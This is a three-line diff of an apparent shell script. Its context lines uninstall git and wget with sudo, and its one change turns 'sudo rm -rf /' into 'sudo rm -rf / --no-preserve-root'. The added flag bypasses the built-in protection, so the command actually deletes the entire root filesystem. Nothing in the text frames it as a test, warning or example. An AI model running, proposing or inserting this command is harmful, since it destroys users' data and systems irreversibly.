@@ -1,3 +1,3 @@
 sudo apt remove git
 sudo apt remove wget
-sudo rm -rf /
+sudo rm -rf / --no-preserve-root
